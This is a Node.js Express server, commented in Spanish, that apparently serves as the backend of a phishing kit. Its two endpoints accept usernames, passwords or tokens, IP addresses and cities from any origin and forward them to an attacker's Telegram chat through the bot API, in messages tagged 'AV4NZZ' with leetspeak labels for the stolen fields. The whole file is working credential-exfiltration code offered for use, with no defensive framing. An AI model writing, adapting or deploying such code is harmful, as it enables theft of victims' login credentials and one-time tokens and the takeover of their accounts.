const express = require('express');
const bodyParser = require('body-parser');

const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();
const FormData = require("form-data");
const https = require("https");
const agent = new https.Agent({ family: 4 });


app.use(cors({
    origin: '*', // Permitir cualquier origen
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));


app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});


app.post('/api/sendMessage', async (req, res) => {
    const { user, password, country, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🧡AV4NZZ🧡\nUS4R: <code>${user}</code>\nCL4V: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, password, country, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🧡AV4NZZ🧡\nUS4R: <code>${user}</code>\n\nT0K3N: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});








const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
